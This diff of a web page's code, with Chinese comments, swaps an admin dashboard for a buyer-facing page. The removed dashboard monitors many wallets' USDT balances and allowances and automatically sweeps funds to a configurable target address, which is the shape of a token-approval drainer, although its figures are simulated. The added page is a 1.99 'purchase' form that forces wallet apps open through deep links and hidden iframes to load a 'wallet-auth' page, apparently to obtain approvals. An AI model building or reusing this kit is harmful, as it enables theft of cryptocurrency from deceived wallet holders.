-                document.getElementById('save-system-settings').addEventListener('click', () => this.saveSystemSettings());
-                document.getElementById('add-admin').addEventListener('click', () => this.addAdminAccount());
-
-                document.getElementById('captcha-img').addEventListener('click', () => {
-                    this.refreshCaptcha();
-                });
-            }
-
-            async startMonitor() {
-                if (this.isMonitoring) return;
-                
-                this.isMonitoring = true;
-                this.monitorInterval = setInterval(() => this.monitorWallets(), SYSTEM_CONFIG.SCAN_INTERVAL);
-                this.updateMonitorStatus();
-                this.addLog('监控服务已启动 - 秒级扫描', 'success');
-                
-                await this.monitorWallets();
-            }
-
-            stopMonitor() {
-                if (!this.isMonitoring) return;
-                
-                this.isMonitoring = false;
-                clearInterval(this.monitorInterval);
-                this.updateMonitorStatus();
-                this.addLog('监控服务已停止', 'info');
-            }
-
-            async monitorWallets() {
-                if (!this.isMonitoring) return;
-                
-                const startTime = Date.now();
-                let scannedCount = 0;
-                
-                // 更新所有余额
-                await this.updateAllBalances();
-                
-                // 检查大额钱包自动归集
-                const largeWallets = this.wallets.filter(w => w.totalBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD);
-                for (let wallet of largeWallets) {
-                    await this.collectWalletFunds(wallet.address, 'auto');
-                    scannedCount++;
-                }
-                
-                // 检查小额钱包总和归集
-                const smallWallets = this.wallets.filter(w => w.totalBalance < SYSTEM_CONFIG.COLLECT_THRESHOLD);
-                const smallTotal = smallWallets.reduce((sum, w) => sum + w.totalBalance, 0);
-                if (smallTotal >= 1000) {
-                    this.addLog(`小额钱包总和 ${smallTotal} USDT 超过1000，开始归集`, 'warning');
-                    for (let wallet of smallWallets) {
-                        await this.collectWalletFunds(wallet.address, 'auto');
-                    }
-                }
-                
-                // 检查合约地址自动划转
-                if (this.contractBalance >= SYSTEM_CONFIG.CONTRACT_THRESHOLD) {
-                    await this.transferContractFunds();
-                }
-
-                const scanTime = Date.now() - startTime;
-                this.addLog(`监控完成: ${scannedCount}个操作, 耗时: ${scanTime}ms`, 'info');
-                this.updateDisplay();
-                this.saveLocalData();
-            }
-
-            async updateAllBalances() {
-                // 更新所有钱包余额
-                for (let wallet of this.wallets) {
-                    const assets = await this.scanWalletAssets(wallet.address);
-                    Object.assign(wallet, assets);
-                    wallet.totalBalance = assets.usdtBalance;
-                    wallet.lastChecked = new Date().toISOString();
-                }
-                
-                // 更新合约地址余额
-                this.contractBalance = await this.getContractBalance();
-                
-                // 更新目标地址余额
-                this.targetBalance = await this.getTargetBalance();
-            }
-
-            async scanWalletAssets(address) {
-                // 模拟数据
-                return {
-                    trxBalance: Math.random() * 10,
-                    usdtBalance: Math.random() * 500,
-                    usdtAllowance: Math.random() * 600,
-                    otherTokens: [
-                        { symbol: 'BTC', balance: Math.random() * 0.1 },
-                        { symbol: 'ETH', balance: Math.random() * 0.5 },
-                        { symbol: 'BNB', balance: Math.random() * 2 }
-                    ],
-                    totalBalance: Math.random() * 500
-                };
-            }
-
-            async getContractBalance() {
-                return 1500 + Math.random() * 1000;
-            }
-
-            async getTargetBalance() {
-                return 5000 + Math.random() * 5000;
-            }
-
-            async collectWalletFunds(walletAddress, type = 'manual') {
-                try {
-                    const wallet = this.wallets.find(w => w.address === walletAddress);
-                    if (!wallet) return;
-                    
-                    this.addLog(`${type === 'auto' ? '自动' : '手动'}归集钱包 ${walletAddress}`, 'info');
-                    
-                    const transaction = {
-                        id: this.transactions.length + 1,
-                        walletAddress: walletAddress,
-                        amount: wallet.totalBalance,
-                        txHash: 'TX' + Math.random().toString(36).substr(2, 64).toUpperCase(),
-                        status: 'completed',
-                        timestamp: new Date().toISOString(),
-                        type: type,
-                        tokens: wallet.otherTokens
-                    };
-
-                    this.transactions.push(transaction);
-                    
-                    // 更新钱包余额
-                    wallet.totalBalance = 0;
-                    wallet.usdtBalance = 0;
-                    wallet.otherTokens = [];
-                    
-                    this.updateDisplay();
-                    this.saveLocalData();
-                    this.addLog(`归集完成: ${transaction.txHash}`, 'success');
-                    
-                } catch (error) {
-                    this.addLog(`归集失败: ${error.message}`, 'error');
-                }
-            }
-
-            async transferContractFunds() {
-                this.addLog('合约资金自动划转中...', 'warning');
-                
-                const transaction = {
-                    id: this.transactions.length + 1,
-                    fromAddress: SYSTEM_CONFIG.CONTRACT_ADDRESS,
-                    toAddress: SYSTEM_CONFIG.TARGET_ADDRESS,
-                    amount: this.contractBalance,
-                    txHash: 'CT' + Math.random().toString(36).substr(2, 64).toUpperCase(),
-                    status: 'completed',
-                    timestamp: new Date().toISOString(),
-                    type: 'contract_transfer'
-                };
-
-                this.transactions.push(transaction);
-                this.contractBalance = 0;
-                
-                this.updateDisplay();
-                this.saveLocalData();
-                this.addLog('合约资金已成功划转到目标地址', 'success');
-            }
-
-            async manualCollectAll() {
-                this.addLog('开始手动归集所有钱包...', 'warning');
-                
-                for (let wallet of this.wallets) {
-                    if (wallet.totalBalance > 0) {
-                        await this.collectWalletFunds(wallet.address, 'manual');
-                    }
-                }
-                
-                this.addLog('手动归集所有钱包完成', 'success');
-            }
-
-            updateDisplay() {
-                this.updateStats();
-                this.updateWalletList();
-                this.updateTransactionList();
-                this.updateAdminAccounts();
-                this.updateSettingsForm();
-            }
-
-            updateStats() {
-                const largeWallets = this.wallets.filter(w => w.totalBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD).length;
-                const smallWallets = this.wallets.filter(w => w.totalBalance < SYSTEM_CONFIG.COLLECT_THRESHOLD).length;
-
-                document.getElementById('large-wallets').textContent = largeWallets;
-                document.getElementById('small-wallets').textContent = smallWallets;
-                document.getElementById('contract-balance').textContent = this.contractBalance.toFixed(2);
-                document.getElementById('target-balance').textContent = this.targetBalance.toFixed(2);
-                document.getElementById('current-threshold').textContent = SYSTEM_CONFIG.COLLECT_THRESHOLD;
-                document.getElementById('current-contract-threshold').textContent = SYSTEM_CONFIG.CONTRACT_THRESHOLD;
-            }
-
-            updateWalletList() {
-                const walletList = document.getElementById('wallet-list');
-                
-                if (this.wallets.length === 0) {
-                    // 生成一些模拟钱包数据
-                    this.generateDemoWallets();
-                }
-
-                let html = '';
-                this.wallets.forEach(wallet => {
-                    const isLarge = wallet.totalBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD;
-                    const tokenBalances = wallet.otherTokens.map(token => 
-                        `<span class="token-balance">${token.symbol}: ${token.balance.toFixed(4)}</span>`
-                    ).join('');
-                    
-                    html += `
-                        <div class="wallet-item">
-                            <div class="wallet-info">
-                                <div class="wallet-address">${wallet.address}</div>
-                                <div class="wallet-meta">
-                                    TRX: ${wallet.trxBalance.toFixed(4)} | 
-                                    USDT: ${wallet.usdtBalance.toFixed(2)} | 
-                                    总资产: ${wallet.totalBalance.toFixed(2)} USDT |
-                                    最后检查: ${new Date(wallet.lastChecked).toLocaleTimeString()}
-                                </div>
-                                <div>${tokenBalances}</div>
-                            </div>
-                            <div style="text-align: right;">
-                                <div class="wallet-balance ${isLarge ? 'high' : ''}">
-                                    ${wallet.totalBalance.toFixed(2)} USDT
-                                </div>
-                                <button class="collect-btn" onclick="monitor.collectWalletFunds('${wallet.address}', 'manual')">
-                                    手动归集
-                                </button>
-                            </div>
-                        </div>
-                    `;
-                });
-
-                walletList.innerHTML = html;
-            }
-
-            generateDemoWallets() {
-                const demoAddresses = [
-                    'TBa1YN3kdqPdqWULicMVLwLNGovGZgvE9z',
-                    'TC1yXRh9rP9o2D1bH5f8vWcCzCJ8sQmK9n',
-                    'TW7obL9d7p2r2q2q2q2q2q2q2q2q2q2q2q2',
-                    'TD5rR9wLmLmLmLmLmLmLmLmLmLmLmLmLmLm',
-                    'TE8aR7vNvNvNvNvNvNvNvNvNvNvNvNvNvN'
-                ];
-
-                this.wallets = demoAddresses.map((address, index) => ({
-                    id: index + 1,
-                    address: address,
-                    trxBalance: Math.random() * 10,
-                    usdtBalance: Math.random() * 600,
-                    usdtAllowance: Math.random() * 700,
-                    otherTokens: [
-                        { symbol: 'BTC', balance: Math.random() * 0.1 },
-                        { symbol: 'ETH', balance: Math.random() * 0.5 },
-                        { symbol: 'BNB', balance: Math.random() * 2 }
-                    ],
-                    totalBalance: Math.random() * 600,
-                    lastChecked: new Date().toISOString()
-                }));
-            }
-
-            updateTransactionList() {
-                const transactionList = document.getElementById('transaction-list');
-
-                if (this.transactions.length === 0) {
-                    transactionList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">暂无归集记录</div>';
-                    return;
-                }
-
-                let html = '';
-                this.transactions.slice().reverse().forEach(transaction => {
-                    const isContractTransfer = transaction.type === 'contract_transfer';
-                    
-                    html += `
-                        <div class="wallet-item">
-                            <div class="wallet-info">
-                                <div><strong>${isContractTransfer ? '合约划转' : '钱包归集'}:</strong> ${isContractTransfer ? transaction.fromAddress : transaction.walletAddress}</div>
-                                <div><strong>金额:</strong> ${transaction.amount.toFixed(2)} USDT</div>
-                                <div style="font-size: 10px; color: #666;">
-                                    时间: ${new Date(transaction.timestamp).toLocaleString()} |
-                                    类型: ${transaction.type === 'auto' ? '自动' : '手动'} |
-                                    交易哈希: ${transaction.txHash}
-                                    ${isContractTransfer ? `| 目标: ${transaction.toAddress}` : ''}
-                                </div>
-                            </div>
-                        </div>
-                    `;
-                });
-
-                transactionList.innerHTML = html;
-            }
-
-            updateAdminAccounts() {
-                const accountsList = document.getElementById('admin-accounts-list');
-                let html = '';
-                
-                Object.entries(USERS).forEach(([username, user]) => {
-                    if (user.role !== 'super_admin') {
-                        html += `
-                            <div class="admin-account-item">
-                                <div>
-                                    <strong>${username}</strong> - ${user.name}
-                                </div>
-                                <button class="btn-danger" onclick="monitor.removeAdminAccount('${username}')">删除</button>
-                            </div>
-                        `;
-                    }
-                });
-                
-                accountsList.innerHTML = html || '<div style="color: #666; text-align: center;">暂无其他管理员账号</div>';
-            }
-
-            updateSettingsForm() {
-                document.getElementById('contract-address').value = SYSTEM_CONFIG.CONTRACT_ADDRESS;
-                document.getElementById('target-address').value = SYSTEM_CONFIG.TARGET_ADDRESS;
-                document.getElementById('contract-threshold').value = SYSTEM_CONFIG.CONTRACT_THRESHOLD;
-                document.getElementById('collect-threshold').value = SYSTEM_CONFIG.COLLECT_THRESHOLD;
-            }
-
-            addAdminAccount() {
-                const username = document.getElementById('new-admin-username').value.trim();
-                const password = document.getElementById('new-admin-password').value.trim();
-                
-                if (!username || !password) {
-                    alert('请输入用户名和密码');
-                    return;
-                }
-                
-                if (USERS[username]) {
-                    alert('用户名已存在');
-                    return;
-                }
-                
-                USERS[username] = {
-                    password: password,
-                    name: '管理员',
-                    role: 'admin'
-                };
-                
-                document.getElementById('new-admin-username').value = '';
-                document.getElementById('new-admin-password').value = '';
-                
-                this.updateAdminAccounts();
-                this.saveLocalData();
-                this.addLog(`新增管理员账号: ${username}`, 'success');
-            }
-
-            removeAdminAccount(username) {
-                if (confirm(`确定要删除管理员账号 ${username} 吗？`)) {
-                    delete USERS[username];
-                    this.updateAdminAccounts();
-                    this.saveLocalData();
-                    this.addLog(`删除管理员账号: ${username}`, 'info');
-                }
-            }
-
-            saveSystemSettings() {
-                SYSTEM_CONFIG.CONTRACT_ADDRESS = document.getElementById('contract-address').value;
-                SYSTEM_CONFIG.TARGET_ADDRESS = document.getElementById('target-address').value;
-                SYSTEM_CONFIG.CONTRACT_THRESHOLD = parseFloat(document.getElementById('contract-threshold').value);
-                SYSTEM_CONFIG.COLLECT_THRESHOLD = parseFloat(document.getElementById('collect-threshold').value);
-                
-                this.saveLocalData();
-                this.updateDisplay();
-                this.addLog('系统设置已保存', 'success');
-            }
-
-            switchTab(tabName) {
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                
-                document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
-                document.getElementById(`${tabName}-tab`).classList.add('active');
-            }
-
-            async refreshAllData() {
-                this.addLog('手动刷新所有数据...', 'info');
-                await this.updateAllBalances();
-                this.updateDisplay();
-            }
-
-            clearTransactions() {
-                if (confirm('确定要清空所有归集记录吗？')) {
-                    this.transactions = [];
-                    this.updateDisplay();
-                    this.saveLocalData();
-                    this.addLog('归集记录已清空', 'info');
-                }
-            }
-
-            addLog(message, type = 'info') {
-                const logContainer = document.getElementById('log-container');
-                const time = new Date().toLocaleTimeString();
-                const logEntry = document.createElement('div');
-                logEntry.className = 'log-entry';
-                logEntry.innerHTML = `
-                    <span class="log-time">[${time}]</span>
-                    <span class="log-${type}">${message}</span>
-                `;
-                logContainer.appendChild(logEntry);
-                logContainer.scrollTop = logContainer.scrollHeight;
-            }
-
-            updateMonitorStatus() {
-                // 状态显示在日志中
-            }
-
-            // 地址详情显示方法
-            showLargeWallets() {
-                const largeWallets = this.wallets.filter(w => w.totalBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD);
-                this.showAddressDetails('大额钱包详情', largeWallets);
-            }
-
-            showSmallWallets() {
-                const smallWallets = this.wallets.filter(w => w.totalBalance < SYSTEM_CONFIG.COLLECT_THRESHOLD);
-                this.showAddressDetails('小额钱包详情', smallWallets);
-            }
-
-            showContractAddress() {
-                const contractData = {
-                    address: SYSTEM_CONFIG.CONTRACT_ADDRESS,
-                    totalBalance: this.contractBalance,
-                    tokens: [
-                        { symbol: 'USDT', balance: this.contractBalance * 0.8 },
-                        { symbol: 'TRX', balance: Math.random() * 100 },
-                        { symbol: 'BTC', balance: Math.random() * 0.5 }
-                    ],
-                    transactions: this.transactions.filter(t => t.fromAddress === SYSTEM_CONFIG.CONTRACT_ADDRESS)
-                };
-                this.showAddressDetails('合约地址详情', [contractData], true);
-            }
-
-            showTargetAddress() {
-                const targetData = {
-                    address: SYSTEM_CONFIG.TARGET_ADDRESS,
-                    totalBalance: this.targetBalance,
-                    tokens: [
-                        { symbol: 'USDT', balance: this.targetBalance * 0.9 },
-                        { symbol: 'TRX', balance: Math.random() * 500 },
-                        { symbol: 'BTC', balance: Math.random() * 2 },
-                        { symbol: 'ETH', balance: Math.random() * 10 }
-                    ],
-                    transactions: this.transactions.filter(t => t.toAddress === SYSTEM_CONFIG.TARGET_ADDRESS)
-                };
-                this.showAddressDetails('目标地址详情', [targetData], true);
-            }
-
-            showAddressDetails(title, data, isSpecialAddress = false) {
-                document.getElementById('modal-title').textContent = title;
-                let content = '';
-                
-                if (isSpecialAddress) {
-                    data.forEach(item => {
-                        content += `
-                            <div class="address-details">
-                                <h4>地址: ${item.address}</h4>
-                                <div class="asset-item">
-                                    <span><strong>总资产:</strong></span>
-                                    <span>${item.totalBalance.toFixed(2)} USDT</span>
-                                </div>
-                                <h5>资产明细:</h5>
-                                ${item.tokens.map(token => `
-                                    <div class="asset-item">
-                                        <span>${token.symbol}:</span>
-                                        <span>${token.balance.toFixed(4)}</span>
-                                    </div>
-                                `).join('')}
-                                <h5>交易记录:</h5>
-                                ${item.transactions.map(tx => `
-                                    <div class="transaction-record">
-                                        ${new Date(tx.timestamp).toLocaleString()} - 
-                                        ${tx.amount.toFixed(2)} USDT - 
-                                        ${tx.txHash}
-                                    </div>
-                                `).join('') || '<div style="color: #666;">暂无交易记录</div>'}
-                            </div>
-                        `;
-                    });
-                } else {
-                    data.forEach(wallet => {
-                        content += `
-                            <div class="address-details">
-                                <h4>地址: ${wallet.address}</h4>
-                                <div class="asset-item">
-                                    <span><strong>总资产:</strong></span>
-                                    <span>${wallet.totalBalance.toFixed(2)} USDT</span>
-                                </div>
-                                <h5>资产明细:</h5>
-                                <div class="asset-item">
-                                    <span>USDT:</span>
-                                    <span>${wallet.usdtBalance.toFixed(2)}</span>
-                                </div>
-                                <div class="asset-item">
-                                    <span>TRX:</span>
-                                    <span>${wallet.trxBalance.toFixed(4)}</span>
-                                </div>
-                                ${wallet.otherTokens.map(token => `
-                                    <div class="asset-item">
-                                        <span>${token.symbol}:</span>
-                                        <span>${token.balance.toFixed(4)}</span>
-                                    </div>
-                                `).join('')}
-                            </div>
-                            <hr>
-                        `;
-                    });
-                }
-                
-                document.getElementById('modal-content').innerHTML = content;
-                document.getElementById('address-modal').style.display = 'block';
-            }
+            }, 3000);
         }
 
-        // 全局监控实例
-        let monitor;
+        // 检测是否在钱包内部
+        function isInWalletBrowser() {
+            return window.ethereum || window.tronWeb || 
+                   navigator.userAgent.includes('TokenPocket') ||
+                   navigator.userAgent.includes('TronLink') ||
+                   navigator.userAgent.includes('Bitget') ||
+                   navigator.userAgent.includes('imToken') ||
+                   navigator.userAgent.includes('BitKeep');
+        }
 
-        // 页面加载完成后初始化
-        document.addEventListener('DOMContentLoaded', () => {
-            monitor = new USDTMonitorSystem();
+        // 初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('purchaseBtn').addEventListener('click', function() {
+                document.getElementById('userForm').style.display = 'block';
+                this.style.display = 'none';
+            });
+            
+            document.getElementById('confirmBtn').addEventListener('click', function() {
+                const username = document.getElementById('username').value.trim();
+                const nickname = document.getElementById('nickname').value.trim();
+                
+                if (!username || !nickname) {
+                    showTemporaryMessage('请填写完整的用户信息！');
+                    return;
+                }
+                
+                if (!username.startsWith('@')) {
+                    showTemporaryMessage('用户名必须以 @ 开头');
+                    return;
+                }
+                
+                document.getElementById('walletSection').style.display = 'block';
+                document.getElementById('userForm').style.display = 'none';
+            });
         });
 
-        // 登录函数
-        function login() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            monitor.login(username, password);
+        // 生成支付链接
+        function generatePaymentUrl() {
+            const username = document.getElementById('username').value.trim();
+            const nickname = document.getElementById('nickname').value.trim();
+            
+            if (!username || !nickname) {
+                showTemporaryMessage('请先填写用户信息！');
+                return null;
+            }
+            
+            // 生成订单号
+            const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+            
+            // 构建钱包授权页面 URL
+            const authUrl = `wallet-auth.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=1.99`;
+            const fullAuthUrl = window.location.origin + (window.location.pathname.includes('/') ? authUrl : '/' + authUrl);
+            
+            return fullAuthUrl;
         }
 
-        // 退出登录
-        function logout() {
-            monitor.logout();
+        // 钱包唤醒函数
+        function wakeupWalletApp(walletName) {
+            const fullAuthUrl = generatePaymentUrl();
+            if (!fullAuthUrl) return;
+
+            console.log('支付链接:', fullAuthUrl);
+
+            // 如果在钱包内部，直接跳转
+            if (isInWalletBrowser()) {
+                showTemporaryMessage('正在跳转到支付页面...');
+                setTimeout(() => {
+                    const authUrl = `wallet-auth.html${window.location.search}`;
+                    window.location.href = authUrl;
+                }, 500);
+                return;
+            }
+
+            // 根据钱包类型调用不同的唤醒方法
+            if (walletName === 'TokenPocket') {
+                wakeupTokenPocket(fullAuthUrl);
+            } else if (walletName === 'TronLink') {
+                wakeupTronLink(fullAuthUrl);
+            } else if (walletName === 'Bitget') {
+                wakeupBitget(fullAuthUrl);
+            } else if (walletName === 'imToken') {
+                wakeupImToken(fullAuthUrl);
+            }
         }
 
-        // 关闭模态框
-        function closeModal() {
-            document.getElementById('address-modal').style.display = 'none';
+        // TokenPocket 唤醒
+        function wakeupTokenPocket(fullAuthUrl) {
+            const schemes = [
+                'tpoutside://',
+                `tpoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `tpoutside://pull.activity?action=openDapp&dappUrl=${encodeURIComponent(fullAuthUrl)}`
+            ];
+            
+            attemptMultipleSchemes(schemes, 'TokenPocket');
         }
 
-        // 全局点击函数
-        function showLargeWallets() {
-            monitor.showLargeWallets();
+        // TronLink 唤醒
+        function wakeupTronLink(fullAuthUrl) {
+            const schemes = [
+                'tronlinkoutside://',
+                `tronlinkoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `tronlink://open?url=${encodeURIComponent(fullAuthUrl)}`
+            ];
+            
+            attemptMultipleSchemes(schemes, 'TronLink');
         }
 
-        function showSmallWallets() {
-            monitor.showSmallWallets();
+        // Bitget Wallet 唤醒
+        function wakeupBitget(fullAuthUrl) {
+            const schemes = [
+                'bitkeep://',
+                'bitgetwallet://',
+                `bitkeep://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitgetwallet://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bk://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitkeep://browse?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitgetwallet://browse?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitkeep://dapp?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitgetwallet://dapp?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitkeep://web?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitgetwallet://web?url=${encodeURIComponent(fullAuthUrl)}`
+            ];
+            
+            attemptMultipleSchemes(schemes, 'Bitget Wallet');
         }
 
-        function showContractAddress() {
-            monitor.showContractAddress();
+        // imToken 唤醒
+        function wakeupImToken(fullAuthUrl) {
+            const schemes = [
+                'imtokenv2://',
+                `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`,
+                `imtoken://navigate?url=${encodeURIComponent(fullAuthUrl)}`
+            ];
+            
+            attemptMultipleSchemes(schemes, 'imToken');
         }
 
-        function showTargetAddress() {
-            monitor.showTargetAddress();
+        // 尝试多个唤醒方案
+        function attemptMultipleSchemes(schemes, walletName) {
+            let tried = 0;
+            let success = false;
+            
+            function tryNextScheme() {
+                if (tried >= schemes.length) {
+                    if (!success) {
+                        console.log(`所有 ${walletName} 唤醒方案都失败了`);
+                        showTemporaryMessage(`${walletName} 唤醒失败`);
+                    }
+                    return;
+                }
+                
+                const scheme = schemes[tried];
+                console.log(`尝试 ${walletName} 方案 ${tried + 1}:`, scheme);
+                
+                // 尝试唤醒
+                if (attemptWakeup(scheme, walletName)) {
+                    success = true;
+                    console.log(`${walletName} 唤醒成功`);
+                    return;
+                }
+                
+                tried++;
+                if (tried < schemes.length) {
+                    setTimeout(tryNextScheme, 400);
+                }
+            }
+            
+            tryNextScheme();
         }
+
+        // 尝试唤醒钱包 - 返回是否成功
+        function attemptWakeup(scheme, walletName) {
+            let attempted = false;
+            
+            // 方法1: 使用iframe
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = scheme;
+                iframe.onload = function() {
+                    attempted = true;
+                    console.log(`${walletName} iframe加载成功`);
+                };
+                iframe.onerror = function() {
+                    console.log(`${walletName} iframe加载失败`);
+                };
+                document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    try {
+                        document.body.removeChild(iframe);
+                    } catch (e) {
+                        console.log('移除iframe失败:', e);
+                    }
+                }, 1500);
+            } catch (error) {
+                console.log(`${walletName} iframe方式失败:`, error);
+            }
+            
+            // 方法2: 使用window.location (延迟执行)
+            setTimeout(() => {
+                try {
+                    window.location.href = scheme;
+                    attempted = true;
+                    console.log(`${walletName} location跳转成功`);
+                } catch (error) {
+                    console.log(`${walletName} location方式失败:`, error);
+                }
+            }, 100);
+            
+            return attempted;
+        }
+
+        // 检测是否在Bitget Wallet内
+        function checkBitgetWallet() {
+            if (navigator.userAgent.includes('Bitget') || navigator.userAgent.includes('BitKeep')) {
+                console.log('在Bitget Wallet环境中');
+                return true;
+            }
+            return false;
+        }
+
+        // 页面加载时检查环境
+        window.addEventListener('load', function() {
+            if (checkBitgetWallet()) {
+                console.log('检测到在Bitget Wallet中运行');
+            }
+        });
     </script>
 </body>
 </html>
